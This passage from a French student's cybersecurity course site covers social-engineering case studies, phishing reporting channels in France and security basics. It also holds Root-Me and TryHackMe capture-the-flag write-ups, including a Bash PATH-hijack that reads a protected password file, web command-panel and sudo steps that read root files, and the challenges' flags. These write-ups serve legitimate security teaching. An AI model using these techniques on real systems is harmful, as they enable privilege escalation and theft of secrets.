\u00e0 une adresse sp\u00e9cifique.</p> </li> </ol>"},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/#consequences","title":"Cons\u00e9quences :","text":"<ul> <li> <p>Financi\u00e8res : Environ 100 000 $ de bitcoins vol\u00e9s en quelques heures.</p> </li> <li> <p>Organisationnelles : Crise de communication pour Twitter, perte de confiance des utilisateurs, enqu\u00eate du FBI.</p> </li> <li> <p>S\u00e9curit\u00e9 : Mise en \u00e9vidence d\u2019un probl\u00e8me majeur : les employ\u00e9s avaient un acc\u00e8s trop large aux outils d\u2019administration internes.</p> </li> </ul> <p>Source : https://fr.wikipedia.org/wiki/D%C3%A9tournement_de_comptes_Twitter_en_juillet_2020</p>"},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/#3-okta-quand-les-super-admins-deviennent-la-porte-dentree","title":"3. Okta : quand les Super Admins deviennent la porte d\u2019entr\u00e9e","text":"<p>Source : https://www.terranovasecurity.com/blog/examples-of-social-engineering-attacks</p> <p>Le fournisseur Okta \u00e0 \u00e9t\u00e9 victime d'une attaque o\u00f9 quatres de leurs clients ont \u00e9t\u00e9 victimes d'une attaque d'ing\u00e9nierie sociale ciblant sp\u00e9cifiquement les utilisateurs d'Okta. Les attaquants ont convaincu les utilisateurs de partager des identifiants ou d'approuver des acc\u00e8s non autoris\u00e9s en usurpant l'identit\u00e9 des employ\u00e9s et en tirant parti des connaissances d'initi\u00e9s. Il est m\u00eame dit que ce qui a \u00e9t\u00e9 communiqu\u00e9 est moins grave que ce qui s'est r\u00e9ellement pass\u00e9. L'attaque a permis l'acc\u00e8s HAR ( HTTP Archive). Les hackers ont r\u00e9cup\u00e9r\u00e9 des jetons de sessions afin de compromettre des comptes administrateurs de plusieurs clients.</p> <p>Exercice 2 :</p> <p>Les erreurs commises par la victime sont les suivantes :\u00a0</p> <ul> <li> <p>Placer son sac sur une chaise au lieu de le mettre sur ses genoux</p> </li> <li> <p>Croire sur parole un inconnu sur la proc\u00e9dure \u00e0 suivre sans demander de preuve de ce qu\u2019il avance</p> </li> <li> <p>Contacter un soi-disant \u201chelp-desk\u201d en ne sachant pas \u00e0 qui elle parle r\u00e9ellement</p> </li> <li> <p>Rentrer son code PIN sur le clavier. En aucun cas, une banque n\u2019est en droit de demander le code PIN d\u2019un client, ou des informations sur une carte.</p> </li> </ul> <p>Exercice 3 :\u00a0</p> <ol> <li> </li> </ol> <p>On ne sait pas encore.</p> <ol> <li> </li> </ol> <p>Les diff\u00e9rentes proc\u00e9dures que d\u2019autres organisations utilisent:</p> <ul> <li> <p>La v\u00e9rification des sources</p> </li> <li> <p>Ne jamais cliquer sur un lien ou ouvrir une pi\u00e8ce jointe sans v\u00e9rifier l\u2019exp\u00e9diteur.</p> </li> <li> <p>Appliquer un doute syst\u00e9matique (mieux vaut v\u00e9rifier plusieurs fois)</p> </li> <li> <p>Utilisez un filtre anti-spams</p> </li> <li> <p>Politique de mot de passe (pas de mots li\u00e9s \u00e0 la personne dans le mot de passe)</p> </li> <li> <p>Imposez l\u2019utilisation de mots de passe fort et du MFA (Authentification multi-facteurs)</p> </li> <li> <p>Restez vigilants vis-\u00e0-vis de tous les exp\u00e9diteurs</p> </li> <li> <p>Mettez en place une politique d'acc\u00e8s au moindre privil\u00e8ge</p> </li> <li> <p>Rappelez les bonnes pratiques r\u00e9guli\u00e8rement !</p> </li> </ul> <p>Source :\u00a0</p> <ul> <li> <p>https://blog.lockself.com/fraude-ingenierie-sociale-conseils-entreprise </p> </li> <li> <p>https://www.ihemi.fr/formations/ressources-pedagogiques/kit-de-sensibilisation/les-fragilites-humaines-lingenierie-sociale</p> </li> <li> <p>https://learn.microsoft.com/fr-fr/security-updates/security/20200390#edaa</p> </li> </ul> <p>Exercice 4 :\u00a0</p> <p>L\u2019hame\u00e7onnage (en anglais phishing) est une technique utilis\u00e9e par des fraudeurs pour obtenir des renseignements personnels dans le but de perp\u00e9trer une usurpation d'identit\u00e9. La technique consiste \u00e0 faire croire \u00e0 la victime qu'elle s'adresse \u00e0 un tiers de confiance \u2014 banque, administration, etc. \u2014 afin de lui soutirer des renseignements personnels : mot de passe, num\u00e9ro de carte de cr\u00e9dit, num\u00e9ro ou photocopie de la carte nationale d'identit\u00e9, date de naissance, etc. En effet, le plus souvent, une copie exacte d'un site internet est r\u00e9alis\u00e9e dans l'optique de faire croire \u00e0 la victime qu'elle se trouve sur le site internet officiel o\u00f9 elle pensait se connecter. La victime va ainsi saisir ses codes personnels qui seront r\u00e9cup\u00e9r\u00e9s par celui qui a cr\u00e9\u00e9 le faux site, il aura ainsi acc\u00e8s aux donn\u00e9es personnelles de la victime et pourra d\u00e9rober tout ce que la victime poss\u00e8de sur ce site. L\u2019attaque peut aussi \u00eatre r\u00e9alis\u00e9e par courrier \u00e9lectronique ou autres moyens \u00e9lectroniques. Lorsque cette technique utilise les SMS pour obtenir des renseignements personnels, elle s'appelle SMiShing.</p> <ol> <li> <p>Chercher des exemples de cette attaque.</p> </li> <li> <p>En France, existe-il un moyen pour le signaler ?</p> </li> </ol>"},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/#votre-ecole-a-t-elle-mis-en-place-des-procedures-pour-aider-a-prevenir-lingenierie-sociale-si-oui-quelles-sont-certaines-de-ces-procedures","title":"Votre \u00e9cole a-t-elle mis en place des proc\u00e9dures pour aider \u00e0 pr\u00e9venir l'ing\u00e9nierie sociale ? Si oui, quelles sont certaines de ces proc\u00e9dures ?","text":""},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/#utiliser-internet-pour-rechercher-des-procedures-que-dautres-organisations-utilisent-pour-empecher-lingenierie-sociale","title":"Utiliser Internet pour rechercher des proc\u00e9dures que d'autres organisations utilisent pour emp\u00eacher l\u2019ing\u00e9nierie sociale ?","text":""},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/#1-exemples-dattaques-par-hameconnage-phishing","title":"1. Exemples d\u2019attaques par hame\u00e7onnage (phishing)","text":"<p>L\u2019hame\u00e7onnage se d\u00e9cline sous diff\u00e9rentes formes, avec des sc\u00e9narios souvent bien rod\u00e9s pour pi\u00e9ger la victime :</p> <ul> <li>Banques et services financiers :\u00a0</li> </ul> <p>Exemple : un faux e-mail imitant la banque BNP Paribas ou Cr\u00e9dit agricole pr\u00e9tend qu\u2019un probl\u00e8me de s\u00e9curit\u00e9 a \u00e9t\u00e9 d\u00e9tect\u00e9 sur le compte. Le message contient un lien vers un faux site reproduisant fid\u00e8lement l\u2019interface bancaire, demandant identifiant et mot de passe.</p> <ul> <li>Services administratifs :\u00a0</li> </ul> <p>Exemple : un faux message se faisant passer pour les imp\u00f4ts ou l\u2019Assurance Maladie (Ameli), invitant la victime \u00e0 \u00ab r\u00e9gulariser \u00bb ou \u00ab confirmer ses informations personnelles \u00bb sous peine de blocage.</p> <ul> <li>Sites de commerce en ligne :\u00a0</li> </ul> <p>Exemple : un faux e-mail Amazon ou Vinted indiquant que la commande est bloqu\u00e9e ou qu\u2019un remboursement est en attente. Le lien redirige vers une copie du site qui r\u00e9cup\u00e8re les donn\u00e9es de connexion et bancaires.</p> <ul> <li>Livraison de colis :\u00a0</li> </ul> <p>Exemple : un SMS pr\u00e9tendant provenir de La Poste ou Chronopost demandant de payer quelques euros pour recevoir un colis. Le lien am\u00e8ne sur une page frauduleuse qui vole les coordonn\u00e9es bancaires.</p> <ul> <li>Phishing cibl\u00e9 (spear phishing) :</li> </ul> <p>Exemple : un faux e-mail envoy\u00e9 \u00e0 un employ\u00e9 d\u2019entreprise, imitant le style d\u2019\u00e9criture du directeur, demandant un virement urgent ou l\u2019acc\u00e8s \u00e0 un fichier confidentiel.</p>"},{"location":"cours-TP/cybersecurite/TD_Social_Engineering/#2-moyens-de-signaler-le-phishing-en-france","title":"2. Moyens de signaler le phishing en France","text":"<p>En France, il existe plusieurs dispositifs officiels pour signaler une tentative de phishing :</p> <ol> <li>Phishing Initiative (service officiel fran\u00e7ais de signalement des sites frauduleux) https://www.phishing-initiative.fr</li> </ol> <p>On peut y signaler l\u2019adresse du site ou l\u2019email frauduleux pour qu\u2019il soit bloqu\u00e9 au plus vite.</p> <ol> <li>Plateforme gouvernementale \u201cInternet-signalement\u201d (PHAROS) https://www.internet-signalement.gouv.fr</li> </ol> <p>C\u2019est la plateforme de signalement de contenus ou comportements illicites sur Internet (dont l\u2019hame\u00e7onnage).</p> <ol> <li> <p>Transfert direct des e-mails suspects</p> </li> <li> <p>Adresse officielle d\u00e9di\u00e9e : phishing@signal-spam.fr</p> </li> <li> <p>La victime peut transf\u00e9rer le message frauduleux tel qu\u2019il a \u00e9t\u00e9 re\u00e7u.</p> </li> <li> <p>Op\u00e9rateurs et banques</p> </li> <li> <p>Les banques disposent souvent de leur propre adresse mail pour signaler les tentatives de phishing.</p> </li> <li> <p>Les op\u00e9rateurs t\u00e9l\u00e9phoniques (Orange, SFR, Bouygues, Free) permettent aussi de signaler les SMS frauduleux en les transf\u00e9rant au 33700 (service officiel contre le spam SMS et appels frauduleux).</p> </li> </ol> <p>En r\u00e9sum\u00e9 :</p> <ul> <li> <p>Pour un site frauduleux \u2192 Phishing Initiative ou Internet-signalement.</p> </li> <li> <p>Pour un mail frauduleux \u2192 transfert \u00e0 phishing@signal-spam.fr.</p> </li> <li> <p>Pour un SMS frauduleux \u2192 transfert au 33700.</p> </li> </ul> <p>Source : https://blog.lockself.com/fraude-ingenierie-sociale-conseils-entreprise</p>"},{"location":"cours-TP/cybersecurite/notions_de_base/","title":"Cours - Les bases de la Cybers\u00e9curit\u00e9","text":""},{"location":"cours-TP/cybersecurite/notions_de_base/#1-definitions","title":"1. D\u00e9finitions","text":"<p>Voici le vocabulaire essentiel \u00e0 ma\u00eetriser :</p> <ul> <li>L'Attaquant : Une personne qui cherche \u00e0 exploiter les vuln\u00e9rabilit\u00e9s potentielles d'un syst\u00e8me.</li> <li>Virus : Un code malveillant attach\u00e9 \u00e0 des fichiers ex\u00e9cutables.</li> <li>SSI : La S\u00e9curit\u00e9 des Syst\u00e8mes d'Information.</li> <li>Cheval de Troie (Trojan) : Malware ex\u00e9cutant des op\u00e9rations malveillantes sous couvert d'une fonction l\u00e9gitime pour tromper l'utilisateur.</li> <li>Rootkit : Malware complexe permettant de maintenir un acc\u00e8s administrateur (root) sur une machine tout en restant cach\u00e9.</li> <li>Vuln\u00e9rabilit\u00e9 : Faille mat\u00e9rielle ou logicielle qui permet d'obtenir un acc\u00e8s non autoris\u00e9.</li> <li>Menace : Cause potentielle d'incident pouvant r\u00e9sulter en un dommage au syst\u00e8me.</li> <li>Attaque : Tentative volontaire d'exploiter une ou plusieurs vuln\u00e9rabilit\u00e9s.</li> <li>Intrusion : Le fait d'acc\u00e9der sans autorisation aux donn\u00e9es d'un syst\u00e8me. C'est la cons\u00e9quence d'une attaque r\u00e9ussie.</li> <li>Cyberspace : Espace de communication constitu\u00e9 par l'interconnexion mondiale d'\u00e9quipements (environ 18 milliards d'objets connect\u00e9s).</li> <li>Phishing (Hame\u00e7onnage) : Technique d'ing\u00e9nierie sociale (Mail ou SMS trompeur) visant \u00e0 voler des informations confidentielles.</li> </ul>"},{"location":"cours-TP/cybersecurite/notions_de_base/#2-le-role-de-letudiant-en-cybersecurite","title":"2. Le r\u00f4le de l'\u00e9tudiant en Cybers\u00e9curit\u00e9","text":"<p>Mission</p> <p>Notre objectif principal se divise en deux axes :</p> <ol> <li>Prot\u00e9ger les Syst\u00e8mes d'Informations (D\u00e9fense / Blue Team).</li> <li>D\u00e9tecter les failles avant les attaquants pour les s\u00e9curiser (Offensif / Red Team).</li> </ol>"},{"location":"cours-TP/cybersecurite/notions_de_base/#3-comment-se-proteger","title":"3. Comment se prot\u00e9ger ?","text":"<p>La s\u00e9curit\u00e9 repose sur plusieurs couches (d\u00e9fense en profondeur) :</p>"},{"location":"cours-TP/cybersecurite/notions_de_base/#securite-physique","title":"S\u00e9curit\u00e9 Physique","text":"<ul> <li>S\u00e9curiser l'acc\u00e8s physique aux machines (badges, serrures).</li> <li>Prot\u00e9ger les serveurs au sein de l'entreprise.</li> <li>Sensibiliser les employ\u00e9s aux risques.</li> </ul>"},{"location":"cours-TP/cybersecurite/notions_de_base/#securite-logique-reseau","title":"S\u00e9curit\u00e9 Logique &amp; R\u00e9seau","text":"<ul> <li>Protection des communications : Utilisation de Pare-feu (Firewall) et d'Antivirus.</li> <li>Mise \u00e0 jour : Activer les mises \u00e0 jour automatiques (OS et logiciels) pour combler les failles.</li> <li>Principe du moindre privil\u00e8ge : Utiliser des comptes avec des droits limit\u00e9s (ne pas rester en Admin/Root tout le temps).</li> </ul>"},{"location":"cours-TP/cybersecurite/notions_de_base/#gestion-des-mots-de-passe","title":"Gestion des Mots de passe","text":"<ul> <li>Utiliser un mot de passe diff\u00e9rent pour chaque service.</li> <li>Utiliser un mot de passe long et complexe (Majuscules, minuscules, chiffres, caract\u00e8res sp\u00e9ciaux).</li> <li>Utiliser un Gestionnaire de Mots de passe (ex: Keepass, Bitwarden).</li> </ul>"},{"location":"cours-TP/cybersecurite/notions_de_base/#4-outil-zphisher","title":"4. Outil : Zphisher","text":"<p>Avertissement</p> <p>Cet outil doit \u00eatre utilis\u00e9 uniquement dans un cadre \u00e9ducatif ou lors d'un audit autoris\u00e9.</p> <p>Zphisher est un outil de script Bash automatis\u00e9 utilis\u00e9 pour le Phishing. Il permet de g\u00e9n\u00e9rer facilement des pages de connexion factices (Facebook, Google, Microsoft, etc.) pour r\u00e9cup\u00e9rer des identifiants lors de tests d'ing\u00e9nierie sociale.</p>"},{"location":"rootme/Programmation/TCP-ChaineEncodee/","title":"TCP - Chaine Encod\u00e9e","text":"<p>Lien vers le challenge : Challenge</p>"},{"location":"rootme/Programmation/TCP-ChaineEncodee/#enonce","title":"\u00c9nonc\u00e9 :","text":""},{"location":"rootme/Programmation/TCP-ChaineEncodee/#procedure","title":"Proc\u00e9dure :","text":"<ol> <li> <p>Analyse et Connexion : Connexion au serveur via un socket TCP. Le serveur envoie un message contenant une cha\u00eene encod\u00e9e entour\u00e9e de guillemets simples.</p> </li> <li> <p>Extraction dynamique : Contrairement au challenge pr\u00e9c\u00e9dent, j'ai utilis\u00e9 une expression r\u00e9guli\u00e8re (Regex) pour isoler proprement le contenu situ\u00e9 entre les guillemets ('...'). Cela rend le script plus robuste si la longueur du message change.</p> </li> <li> <p>D\u00e9codage : La cha\u00eene extraite est encod\u00e9e en Base64. Utilisation de la librairie standard pour la d\u00e9coder en texte clair.</p> </li> <li> <p>Validation : Envoi de la cha\u00eene d\u00e9cod\u00e9e (suivie d'un saut de ligne \\n) au serveur pour valider l'\u00e9preuve et obtenir le flag.</p> </li> </ol>"},{"location":"rootme/Programmation/TCP-ChaineEncodee/#code","title":"Code :","text":"<pre><code>import base64\nimport socket\nimport re # Expressions r\u00e9guli\u00e8res pour isoler la cha\u00eene\nHOST = \"challenge01.root-me.org\"  \nPORT = 52023 \n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.connect((HOST, PORT))\n\n    #recup la data\n    data = s.recv(4096).decode('utf-8')\n    print(data)\n\n    match = re.search(r\"'(.*?)'\", data) #expression reguliere pour recup la chaine entre les quotes\n\n\n    if match: #si on a un match :\n        encoded_string = match.group(1) #on recup la chaine\n        print(\"Encoded string:\", encoded_string)\n\n\n        decoded_string = base64.b64decode(match.group(1)).decode('utf-8') #on decode la chaine\n        print(\"Decoded string:\", decoded_string)\n\n        response = decoded_string + \"\\n\"  #on prepare la reponse en ajoutant un saut de ligne\n        s.send(response.encode('utf-8'))  #on envoie la reponse\n\n        result= s.recv(4096)  #on recupere la reponse du serveur\n        print(\"Server response:\", result.decode('utf-8'))\n\n    else:\n        print(\"No encoded string found in the received data.\")\n</code></pre>"},{"location":"rootme/Programmation/TCP-ChaineEncodee/#resultat","title":"R\u00e9sultat :","text":"<p>On obtient donc le flag en executant le code : </p> <p></p>"},{"location":"rootme/Programmation/TCP-ChaineEncodee/#flag","title":"Flag :","text":"<p>Le Flag est : RM{TCP_Enc0d3_4nd_D3c0d3}</p>"},{"location":"rootme/Programmation/TCP-RetourAuCollege/","title":"TCP - Retour au coll\u00e8ge","text":"<p>Lien vers le challenge : Challenge Root-Me</p>"},{"location":"rootme/Programmation/TCP-RetourAuCollege/#enonce","title":"\u00c9nonc\u00e9 :","text":""},{"location":"rootme/Programmation/TCP-RetourAuCollege/#procedure","title":"Proc\u00e9dure :","text":"<p>Le challenge impose un d\u00e9lai de r\u00e9ponse tr\u00e8s court (2 secondes), ce qui rend la r\u00e9solution manuelle impossible. J'ai donc \u00e9crit un script Python pour automatiser la t\u00e2che :</p> <ol> <li> <p>Connexion au serveur : Utilisation de la biblioth\u00e8que socket pour \u00e9tablir une connexion TCP sur le port 52002.</p> </li> <li> <p>Extraction des donn\u00e9es : R\u00e9ception de l'\u00e9nonc\u00e9 brut. J'ai identifi\u00e9 les positions fixes des deux nombres dans la cha\u00eene de caract\u00e8res re\u00e7ue pour les extraire (via du slicing sur les index 171 et 191).</p> </li> <li> <p>Calcul math\u00e9matique : Application de la formule : sqrt(nombre1)\u200b\u200b\u00d7nombre2\u200b, puis arrondissement du r\u00e9sultat \u00e0 2 chiffres apr\u00e8s la virgule.</p> </li> <li> <p>Envoi de la r\u00e9ponse : Conversion du r\u00e9sultat en cha\u00eene de caract\u00e8res (encod\u00e9e en bytes), ajout d'un saut de ligne (\\n) et envoi au serveur pour r\u00e9cup\u00e9rer le flag.</p> </li> </ol>"},{"location":"rootme/Programmation/TCP-RetourAuCollege/#code","title":"Code :","text":"<pre><code>import math\nimport socket\n\nHOST = \"challenge01.root-me.org\"  \nPORT = 52002  \n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.connect((HOST, PORT))\n    data = s.recv(1024)\n    print(data)\n    print(\"a=\"+str(data[171:174]))     \n    print(\"b=\"+str(data[191:195]))\n    a=math.sqrt(int(data[171:174]))\n    b=int(data[191:195])*a\n    r=round(b, 2)\n    print(r)\n    c=bytes(str(r)+\"\\n\",'utf-8')\n    print(\"c=\"+c.decode())\n\n    s.send(c)\n    data2=s.recv(1024)\n\nprint(f\"Received {data2!r}\")\n</code></pre>"},{"location":"rootme/Programmation/TCP-RetourAuCollege/#resultat","title":"R\u00e9sultat","text":"<p>On obtient donc le flag en executant le code :  </p>"},{"location":"rootme/Programmation/TCP-RetourAuCollege/#flag","title":"Flag :","text":"<p>Le Flag est donc RM{TCP_C0nnecT_4nD_m4Th}</p>"},{"location":"rootme/Steganographie/TwitterSecrt/","title":"Twitter Secret Message","text":"<p>Lien vers le challenge : Challenge</p>"},{"location":"rootme/Steganographie/TwitterSecrt/#enonce","title":"\u00c9nonc\u00e9 :","text":""},{"location":"rootme/Steganographie/TwitterSecrt/#procedure","title":"Proc\u00e9dure :","text":"<p>On r\u00e9cup\u00e8re le message cod\u00e9 :  <pre><code>\uff23h\uff4fose\u2009\u2006a\u2000 j\u03bf\uff42\u2005\u2008y\u043eu\u2002\u2029l\u03bf\u03bd\uff45,\u2005 and\u2000\u2004you \u2000\uff57\u0456\uff4cl\u2003 \uff4ee\uff56\uff45\uff52 \u2007have \u2028t\u03bf\u2008\u2028\uff57\uff4frk\u2003\u2007a\u2001\u2005day \u2004in\u2001\u2009y\u03bfur\u2029\u2001l\u0456f\uff45\uff0e\u2007\u2000\u2002\n</code></pre></p> <p>On peut ensuite utiliser ce site (ou un autre) : https://holloway.nz/steg/</p> <p>On copie colle le texte et on obtient le lieu de rendez vous.</p> <p></p> <p>Maintenant il reste plus qu'\u00e0 r\u00e9cuperer le lieu de rendez vous en question : </p> <p></p> <p>On a le flag : grand central terminal</p>"},{"location":"rootme/Systeme/Bash-System1/","title":"Bash - System 1","text":"<p>Lien vers le challenge : Challenge</p>"},{"location":"rootme/Systeme/Bash-System1/#enonce","title":"\u00c9nonc\u00e9 :","text":""},{"location":"rootme/Systeme/Bash-System1/#procedure","title":"Proc\u00e9dure :","text":"<ol> <li> <p>On se connecte en ssh :   password : app-script-ch11</p> </li> <li> <p>On se balade sur la session avec un <code>ls</code> on d\u00e9couvre plusieurs fichier dans un executable : On l'execute   On tombe sur un chemin on en d\u00e9duit que l'on doit lire ce fichier avec de r\u00e9cuperer le flag. Il y le code de ch11.c :  <pre><code>#include &lt;stdlib.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void)\n{\n    setreuid(geteuid(), geteuid());\n    system(\"ls /challenge/app-script/ch11/.passwd\");\n    return 0;\n}\n</code></pre></p> </li> <li> <p>Phase de test :  Tout simplement, on essaye de lire le fichier <code>cat /challenge/app-script/ch11/.passwd</code> </p> </li> <li> <p>Phase d'action : On va essayer de cr\u00e9er un faux binaire un fichier \"ls\" qui va remplacer le ls du code de ch11.c</p> </li> </ol> <pre><code>cd /tmp\n# Cr\u00e9er un faux fichier \"ls\" qui va lire le mot de passe\necho \"/bin/cat /challenge/app-script/ch11/.passwd\" &gt; ls\nchmod +x ls\n# Modifier le PATH pour que le syst\u00e8me cherche ici en premier\nexport PATH=/tmp:$PATH\n# Ex\u00e9cuter le programme vuln\u00e9rable\n/challenge/app-script/ch11/ch11\n</code></pre>"},{"location":"rootme/Systeme/Bash-System1/#resultat","title":"R\u00e9sultat :","text":"<p>Apr\u00e8s avoir execut\u00e9s les commandes, on tombe sur le flag :  </p>"},{"location":"rootme/Systeme/Bash-System1/#flag","title":"Flag :","text":"<p>Le Flag est : !oPe96a/.s8d5</p>"},{"location":"tryhackme/WebHacking/PickleRick/","title":"Pickle Rick CTF","text":""},{"location":"tryhackme/WebHacking/PickleRick/#procedure","title":"Proc\u00e9dure :","text":""},{"location":"tryhackme/WebHacking/PickleRick/#flag-1","title":"FLAG 1 :","text":"<p>On commence avec un scan :  </p> <p>On voit qu'on peut aller sur le port 80 donc http :  http://10.82.134.213/</p> <p>On arrive sur cette page :  En inspectant le code source on \u00e0 :   On r\u00e9cup\u00e8re donc l'username :      - R1ckRul3s On a donc un username.</p> <p>On utilise ensuite gobuster pour d\u00e9couvrir les directory qu'on peut utiliser : </p> <p></p> <p>On a donc pleins de choses int\u00e9ressantes :     -robots.txt     -/assets</p> <p>On va commencer par robots.txt :  http://10.82.134.213/robots.txt</p> <p>on va curl ca :  </p> <p>On a : Wubbalubbadubdub</p> <p>On essaye maintenant de se connecter \u00e0 http:///login.php  Ca marche,  <p>On essaye l'user et le mdp : user : R1ckRul3s psswd : Wubbalubbadubdub</p> <p>On arrive sur http://10.82.134.213/portal.php </p> <p>On voit donc maintenant un command pannel, c'est une console utilisable, on va tester des commandes :</p> <p>ls -l </p> <p>On a pleins de nouveau fichier \u00e0 d\u00e9couvrir : </p> <p>On curl : http://10.82.134.213/Sup3rS3cretPickl3Ingred.txt  On \u00e0 le premier ingr\u00e9dient ! </p> <p>FLAG 1 : mr. meeseek hair</p>"},{"location":"tryhackme/WebHacking/PickleRick/#flag-2","title":"FLAG 2:","text":"<p>On va se balader sur le syst\u00e8me :</p> <p>ls /home/ </p> <p>ls /home/rick </p> <p>On va lire le fichier pour voir le nouveau flag :  less /home/rick/\"second ingredients\" </p> <p>On a maintenant : 1 jerry tear</p> <p>FLAG 2 : 1 jerry tear</p>"},{"location":"tryhackme/WebHacking/PickleRick/#flag-3","title":"FLAG 3 :","text":"<p>On recup\u00e8re les privil\u00e8ges assez facilement : sudo -l </p> <p>On peut donc utiliser sudo ici ! </p> <p>on va donc voir le dossier root :  sudo ls -l /root/ </p> <p>On peut pas utiliser cat donc on utilise less :</p> <p>sudo less /root/3rd.txt</p> <p>On obtient donc le troisi\u00e8me et dernier flag : </p> <p></p> <p>FLAG 3 : fleeb juice </p>"},{"location":"tryhackme/WebHacking/PickleRick/#on-obtient-donc-les-3-flags-et-le-ctf-est-termine","title":"On obtient donc les 3 flags et le CTF est termin\u00e9 !","text":""}]}